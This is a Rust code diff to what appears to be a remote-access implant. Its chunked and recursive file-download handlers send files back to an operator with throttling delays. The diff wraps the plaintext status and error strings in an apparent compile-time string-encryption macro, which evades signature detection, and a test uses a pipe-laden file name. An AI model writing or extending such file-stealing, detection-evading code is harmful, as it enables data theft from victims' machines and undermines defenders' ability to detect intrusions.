@@ -211,7 +211,7 @@ pub async fn handle_file_download_chunked(ctx: &HandlerContext, cmd: &str, req_i
         // behavior change.
         let chunk_sleep_ms = crate::config::config().transfer.download_chunk_sleep_ms;
 
-        let batch_ts = chrono::Utc::now().format("%Y%d%m_%H%M%S_%3f").to_string();
+        let batch_ts = chrono::Utc::now().format(aes_str!("%Y%d%m_%H%M%S_%3f").as_str()).to_string();
 
         let root_name = std::path::Path::new(&path)
             .parent()
@@ -252,7 +252,7 @@ pub async fn handle_file_download_chunked(ctx: &HandlerContext, cmd: &str, req_i
                 Err(e) => {
                     let resp = CommandResponse {
                         request_id: req_id, output: String::new(),
-                        error: format!("Cannot stat {}: {}", path, e), exit_code: 1,
+                        error: format!("{} {}: {}", aes_str!("Cannot stat"), path, e), exit_code: 1,
                     };
                     if let Ok(j) = serde_json::to_vec(&resp) {
                         let _ = chunk_tx.blocking_send(j);
@@ -269,7 +269,7 @@ pub async fn handle_file_download_chunked(ctx: &HandlerContext, cmd: &str, req_i
                 Err(e) => {
                     let resp = CommandResponse {
                         request_id: req_id, output: String::new(),
-                        error: format!("Cannot open {}: {}", path, e), exit_code: 1,
+                        error: format!("{} {}: {}", aes_str!("Cannot open"), path, e), exit_code: 1,
                     };
                     if let Ok(j) = serde_json::to_vec(&resp) {
                         let _ = chunk_tx.blocking_send(j);
@@ -300,7 +300,7 @@ pub async fn handle_file_download_chunked(ctx: &HandlerContext, cmd: &str, req_i
                         Err(e) => {
                             let resp = CommandResponse {
                                 request_id: req_id, output: String::new(),
-                                error: format!("Read error (chunk {}): {}", chunk_idx, e),
+                                error: format!("{} ({} {}): {}", aes_str!("Read error"), aes_str!("chunk"), chunk_idx, e),
                                 exit_code: 1,
                             };
                             if let Ok(j) = serde_json::to_vec(&resp) {
@@ -333,10 +333,11 @@ pub async fn handle_file_download_chunked(ctx: &HandlerContext, cmd: &str, req_i
 
             let mb = file_size as f64 / (1024.0 * 1024.0);
             let done = format!(
-                "[+] Chunked download complete: {}  ({:.1} MB, {} chunk{})  batch={}",
-                path, mb, chunk_idx,
+                "{}: {}  ({:.1} {}, {} {}{})  {}={}",
+                aes_str!("[+] Chunked download complete"),
+                path, mb, aes_str!("MB"), chunk_idx, aes_str!("chunk"),
                 if chunk_idx == 1 { "" } else { "s" },
-                batch_ts,
+                aes_str!("batch"), batch_ts,
             );
             let resp = CommandResponse {
                 request_id: req_id, output: done,
@@ -379,7 +380,7 @@ pub async fn handle_recursive_download(ctx: &HandlerContext, cmd: &str, req_id: 
         let chunk_sleep_ms = config().transfer.chunk_sleep_ms;
         let files_per_yield = config().transfer.files_per_yield.max(1);
 
-        let batch_ts = chrono::Utc::now().format("%Y%d%m_%H%M%S_%3f").to_string();
+        let batch_ts = chrono::Utc::now().format(aes_str!("%Y%d%m_%H%M%S_%3f").as_str()).to_string();
         let root_name = std::path::Path::new(&root_path)
             .file_name().unwrap_or_default().to_string_lossy().to_string();
 
@@ -929,8 +930,10 @@ mod tests {
         // The skipped file is recorded in failed_downloads …
         let json = report.splitn(4, '|').nth(3).expect("report json field");
         let v: serde_json::Value = serde_json::from_str(json).unwrap();
-        assert_eq!(v["total_success"].as_u64().unwrap(), 1);
-        let failed = v["failed_downloads"].as_array().unwrap();
+        // RecursiveReport is a positional seq (see src/file_transfer.rs):
+        // [root_path, total_files_found, total_success, failed_downloads].
+        assert_eq!(v[2].as_u64().unwrap(), 1);
+        let failed = v[3].as_array().unwrap();
         assert_eq!(failed.len(), 1);
         assert!(failed[0][0].as_str().unwrap().contains("evil|name.txt"));
 
